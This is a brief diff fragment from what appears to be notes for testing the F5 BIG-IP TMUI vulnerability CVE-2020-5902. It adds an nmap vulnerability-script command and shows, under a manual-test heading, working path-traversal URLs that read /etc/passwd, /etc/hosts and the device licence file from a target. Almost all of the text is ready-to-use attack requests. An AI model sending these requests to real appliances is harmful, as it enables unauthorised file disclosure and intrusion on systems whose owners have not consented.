@@ -14,6 +14,8 @@ Queries processed: 0<p>
 
 #Manual_Test
 
+sudo nmap --script=http-vuln-cve2020-5902.nse -p PORT IP
+
 https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
 https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts
 https://IP/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
